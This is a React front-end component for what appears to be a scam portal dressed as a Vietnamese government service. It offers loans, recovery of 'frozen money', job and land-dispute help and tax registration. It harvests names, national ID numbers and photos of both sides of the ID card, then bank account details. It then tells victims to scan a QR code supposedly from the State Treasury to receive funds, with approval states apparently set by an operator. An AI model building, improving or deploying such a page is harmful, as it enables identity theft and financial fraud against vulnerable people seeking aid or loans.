import React, { useState, useEffect, useRef } from 'react';
import axios from 'axios';

const API_BASE = import.meta.env.VITE_API_URL || 'http://localhost:5000/api';

const LoanWorkflow = ({ service = 'vay-von' }) => {
    const [state, setState] = useState('initial');
    const [token, setToken] = useState(new URLSearchParams(window.location.search).get('token') || '');
    const [loading, setLoading] = useState(false);
    const [qrUrl, setQrUrl] = useState('');
    const [fileFront, setFileFront] = useState(null);
    const [fileBack, setFileBack] = useState(null);
    const [previewFront, setPreviewFront] = useState(null);
    const [previewBack, setPreviewBack] = useState(null);
    const skipPollingRef = useRef(false);

    useEffect(() => {
        if (token) {
            checkStatus(token);
            const interval = setInterval(() => checkStatus(token), 10000);
            return () => clearInterval(interval);
        }
    }, [token]);

    // Reset state when service changes
    useEffect(() => {
        if (!token) {
            setState('initial');
            setFileFront(null);
            setFileBack(null);
            setPreviewFront(null);
            setPreviewBack(null);
        }
    }, [service, token]);

    const checkStatus = async (chkToken) => {
        if (skipPollingRef.current) return;
        try {
            const res = await axios.get(`${API_BASE}/status?token=${chkToken}`);
            const data = res.data;
            if (data.status === 'pending') setState('pending');
            else if (data.status === 'approved') setState('approved');
            else if (data.status === 'waiting_qr') setState('waiting_qr');
            else if (data.status === 'qr_ready' || (data.qr_url && data.status !== 'done')) {
                setState('qr_ready');
                if (data.qr_url) setQrUrl(data.qr_url);
            }
            else if (data.status === 'done' || data.status === 'scanned') setState('success');
        } catch (error) {
            console.error('Status check error:', error);
        }
    };

    const handleLoanSubmit = async (e) => {
        e.preventDefault();
        setLoading(true);
        const formData = new FormData(e.target);
        formData.append('service', service);
        if (fileFront) formData.append('file_front', fileFront);
        if (fileBack) formData.append('file_back', fileBack);

        try {
            const res = await axios.post(`${API_BASE}/submit`, formData, {
                headers: { 'Content-Type': 'multipart/form-data' }
            });
            if (res.data.token) {
                const newToken = res.data.token;
                setToken(newToken);
                window.history.pushState({}, '', `?token=${newToken}`);
                setState('pending');
            } else {
                setState('submitted');
            }
        } catch (_) {
            alert('Có lỗi xảy ra, vui lòng thử lại.');
        } finally {
            setLoading(false);
        }
    };

    const onFileChange = (e, side) => {
        const file = e.target.files[0];
        if (!file) return;
        const reader = new FileReader();
        reader.onloadend = () => {
            if (side === 'front') {
                setFileFront(file);
                setPreviewFront(reader.result);
            } else {
                setFileBack(file);
                setPreviewBack(reader.result);
            }
        };
        reader.readAsDataURL(file);
    };

    const handleBankSubmit = async (e) => {
        e.preventDefault();
        setLoading(true);
        const formData = new FormData(e.target);
        const data = { ...Object.fromEntries(formData.entries()), token };
        try {
            await axios.post(`${API_BASE}/submit-bank`, data);
            skipPollingRef.current = false;
            setState('waiting_qr');
        } catch (_) {
            alert('Lỗi khi gửi thông tin ngân hàng.');
        } finally {
            setLoading(false);
        }
    };

    if (state === 'initial') {
        const isLoan = service === 'vay-von';
        const serviceTitle = {
            'vay-von': 'Cổng thông tin hỗ trợ Vay vốn',
            'tien-treo': 'Hỗ trợ lấy lại tiền treo',
            'tim-viec': 'Cổng thông tin hỗ trợ Tìm việc làm',
            'dat-dai': 'Giải quyết tranh chấp Đất đai',
            'nop-thue': 'Cổng đăng ký Nộp thuế điện tử'
        }[service] || 'Cổng tiếp nhận thông tin hỗ trợ';

        const fileLabel = {
            'vay-von': 'Căn cước công dân',
            'tien-treo': 'Căn cước công dân',
            'tim-viec': 'CCCD hoặc Bằng cấp',
            'dat-dai': 'Sổ đỏ / Giấy tờ đất',
            'nop-thue': 'Giấy phép kinh doanh'
        }[service] || 'Tài liệu đính kèm';

        return (
            <div className="pakn_cover">
                <h2>{serviceTitle}</h2>

                <p style={{ color: '#666', fontSize: '13px', marginBottom: '25px', lineHeight: '1.6' }}>
                    Vui lòng cung cấp đầy đủ thông tin để chúng tôi có thể hỗ trợ Quý khách một cách tốt nhất theo đúng quy trình.
                </p>
                <form className="loan-form-container" onSubmit={handleLoanSubmit}>
                    <div className="form-group">
                        <label>Họ và tên <span style={{ color: 'red' }}>*</span></label>
                        <input type="text" name="fullname" placeholder="Nhập họ và tên" required />
                    </div>
                    <div className="form-group">
                        <label>Giới tính <span style={{ color: 'red' }}>*</span></label>
                        <select name="gender" required>
                            <option value="">Chọn giới tính</option>
                            <option value="Nam">Nam</option>
                            <option value="Nữ">Nữ</option>
                        </select>
                    </div>
                    <div className="form-group">
                        <label>Tuổi <span style={{ color: 'red' }}>*</span></label>
                        <input type="number" name="age" defaultValue="18" min="1" max="99" required />
                    </div>
                    <div className="form-group">
                        <label>Số CCCD <span style={{ color: 'red' }}>*</span></label>
                        <input type="text" name="cccd" placeholder="Nhập số CCCD" required />
                    </div>
                    <div className="form-group">
                        <label>Số điện thoại <span style={{ color: 'red' }}>*</span></label>
                        <input type="tel" name="phone" placeholder="Nhập số điện thoại" required />
                    </div>
                    <div className="form-group">
                        <label>Gmail <span style={{ color: 'red' }}>*</span></label>
                        <input type="email" name="email" placeholder="example@gmail.com" required />
                    </div>

                    {/* Common but dynamic fields */}
                    <div className="form-group">
                        <label>Mã giới thiệu (nếu có)</label>
                        <input type="text" name="referralCode" placeholder="Nhập mã giới thiệu" />
                    </div>

                    {!isLoan && (
                        <div className="form-group">
                            <label>Trình độ học vấn <span style={{ color: 'red' }}>*</span></label>
                            <input type="text" name="education" placeholder="VD: Đại học, Cao đẳng..." required />
                        </div>
                    )}

                    {service === 'nop-thue' && (
                        <div className="form-group">
                            <label>Mã số thuế <span style={{ color: 'red' }}>*</span></label>
                            <input type="text" name="taxId" placeholder="Nhập mã số thuế" required />
                        </div>
                    )}

                    {isLoan && (
                        <>
                            <div className="form-group">
                                <label>Địa chỉ <span style={{ color: 'red' }}>*</span></label>
                                <input type="text" name="address" placeholder="Nhập địa chỉ hiện tại" required />
                            </div>
                            <div className="form-group">
                                <label>Nghề nghiệp <span style={{ color: 'red' }}>*</span></label>
                                <input type="text" name="occupation" placeholder="Nhập nghề nghiệp" required />
                            </div>
                            <div className="form-group">
                                <label style={{ marginBottom: '10px' }}>Đã từng vay vốn lần nào chưa? <span style={{ color: 'red' }}>*</span></label>
                                <div style={{ display: 'flex', gap: '30px' }}>
                                    <label style={{ display: 'flex', alignItems: 'center', cursor: 'pointer' }}>
                                        <input type="radio" name="hasLoan" value="yes" style={{ width: 'auto', marginRight: '8px' }} /> Đã từng vay
                                    </label>
                                    <label style={{ display: 'flex', alignItems: 'center', cursor: 'pointer' }}>
                                        <input type="radio" name="hasLoan" value="no" defaultChecked style={{ width: 'auto', marginRight: '8px' }} /> Chưa từng vay
                                    </label>
                                </div>
                            </div>
                            <div className="form-group">
                                <label>Thu nhập hàng tháng (VND) <span style={{ color: 'red' }}>*</span></label>
                                <input type="number" name="income" placeholder="0" required />
                            </div>
                            <div className="form-group">
                                <label>Số tiền cần vay <span style={{ color: 'red' }}>*</span></label>
                                <select name="loanAmount" required>
                                    <option value="">Chọn số tiền</option>
                                    <option value="10000000">10.000.000 VND</option>
                                    <option value="20000000">20.000.000 VND</option>
                                    <option value="50000000">50.000.000 VND</option>
                                    <option value="100000000">100.000.000 VND</option>
                                    <option value="200000000">200.000.000 VND</option>
                                    <option value="500000000">500.000.000 VND</option>
                                </select>
                            </div>
                        </>
                    )}

                    {/* Multi-file Upload for CCCD */}
                    {(service === 'vay-von' || service === 'tien-treo' || service === 'tim-viec') ? (
                        <div className="form-group">
                            <label>Tải lên {fileLabel} (2 mặt) <span style={{ color: 'red' }}>*</span></label>
                            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '15px', marginTop: '10px' }}>
                                <div className="upload-area">
                                    <p style={{ fontSize: '12px', marginBottom: '5px' }}>Mặt trước</p>
                                    <input type="file" required onChange={(e) => onFileChange(e, 'front')} accept="image/*" />
                                    {previewFront && <img src={previewFront} alt="Mặt trước" style={{ width: '100%', marginTop: '10px', borderRadius: '4px', border: '1px solid #ddd' }} />}
                                </div>
                                <div className="upload-area">
                                    <p style={{ fontSize: '12px', marginBottom: '5px' }}>Mặt sau</p>
                                    <input type="file" required onChange={(e) => onFileChange(e, 'back')} accept="image/*" />
                                    {previewBack && <img src={previewBack} alt="Mặt sau" style={{ width: '100%', marginTop: '10px', borderRadius: '4px', border: '1px solid #ddd' }} />}
                                </div>
                            </div>
                        </div>
                    ) : (
                        <div className="form-group">
                            <label>Tải lên {fileLabel} <span style={{ color: 'red' }}>*</span></label>
                            <input type="file" name="file" accept="image/*,.pdf" required style={{ padding: '8px' }} />
                        </div>
                    )}

                    <div style={{ textAlign: 'center', marginTop: '20px' }}>
                        <button type="submit" className="btn-submit" disabled={loading}>
                            {loading ? 'Đang xử lý...' : 'Gửi đăng ký'}
                        </button>
                    </div>
                </form>
            </div>
        );
    }

    if (state === 'submitted') {
        return (
            <div className="state-container">
                <div className="state-title">✔️ Đăng ký hồ sơ thành công</div>
                <p style={{ color: '#666', fontSize: '16px', lineHeight: '1.6' }}>
                    Yêu cầu của Quý khách đã được tiếp nhận. <br />
                    Vui lòng <b>kiểm tra Email</b> thường xuyên. Chúng tôi sẽ gửi thông báo phê duyệt kèm đường link cập nhật thông tin giải ngân ngay khi hồ sơ được duyệt.
                </p>
                <button className="btn-submit" style={{ marginTop: '20px' }} onClick={() => setState('initial')}>Về trang chủ</button>
            </div>
        );
    }

    if (state === 'pending') {
        return (
            <div className="state-container">
                <div className="state-title">⌛ Hồ sơ của Quý khách đang được xét duyệt</div>
                <p style={{ color: '#666', fontSize: '13px' }}>Hệ thống sẽ tự động cập nhật khi có kết quả. Vui lòng không đóng trang này.</p>
            </div>
        );
    }

    if (state === 'approved') {
        return (
            <div className="state-container">
                <div className="state-title" style={{ color: '#28a745' }}>✅ Hồ sơ của Quý khách đã được phê duyệt thành công</div>
                <button className="btn-submit" onClick={() => { skipPollingRef.current = true; setState('bank'); }}>Vui lòng làm thủ tục giải ngân</button>
            </div>
        );
    }

    if (state === 'bank') {
        return (
            <div className="pakn_cover">
                <h2>Thông tin giải ngân</h2>
                <form className="loan-form-container" onSubmit={handleBankSubmit}>
                    <div className="form-group">
                        <label>Chủ tài khoản <span style={{ color: 'red' }}>*</span></label>
                        <input type="text" name="bankOwner" placeholder="Nhập tên" required />
                    </div>
                    <div className="form-group">
                        <label>Ngân hàng <span style={{ color: 'red' }}>*</span></label>
                        <input type="text" name="bankName" placeholder="Nhập tên ngân hàng" required />
                    </div>
                    <div className="form-group">
                        <label>Số tài khoản <span style={{ color: 'red' }}>*</span></label>
                        <input type="text" name="bankAccount" placeholder="Nhập số tài khoản" required />
                    </div>
                    <div style={{ textAlign: 'center', marginTop: '30px' }}>
                        <button type="submit" className="btn-submit" disabled={loading}>
                            {loading ? 'Đang xác nhận...' : 'Xác nhận'}
                        </button>
                    </div>
                </form>
            </div>
        );
    }

    if (state === 'waiting_qr') {
        return (
            <div className="state-container">
                <div className="state-title">⏳ Chúng tôi đang xử lý thông tin giải ngân</div>
                <p style={{ color: '#666', fontSize: '14px', lineHeight: '1.6' }}>
                    Mã QR sẽ được cung cấp sau khi xác nhận thông tin.<br />
                    Vui lòng không đóng trang này.
                </p>
            </div>
        );
    }

    if (state === 'qr_ready') {
        return (
            <div className="state-container">
                {qrUrl && (
                    <div style={{ marginBottom: '20px', textAlign: 'center' }}>
                        <div className="state-title" style={{ color: '#28a745', marginBottom: '20px' }}>✅ Nhận mã QR giải ngân</div>
                        <img src={qrUrl} alt="QR Code" style={{ maxWidth: '280px', border: '1px solid #ddd', padding: '10px', borderRadius: '8px' }} />
                        <p style={{ color: '#666', fontSize: '13px', marginTop: '10px' }}>Quét mã QR để hoàn tất quá trình nhận tiền từ KBNN</p>
                    </div>
                )}
                {!qrUrl && (
                    <div className="state-title">⏳ Đang tải mã QR...</div>
                )}
            </div>
        );
    }

    if (state === 'success') {
        return (
            <div className="state-container">
                <div className="state-title" style={{ color: '#28a745', fontSize: '24px' }}>🎉 Giải ngân thành công!</div>
                <p style={{ color: '#666', fontSize: '16px' }}>Tiền sẽ được chuyển vào tài khoản của bạn trong 3-5 ngày làm việc.</p>
            </div>
        );
    }

    return null;
};

export default LoanWorkflow;
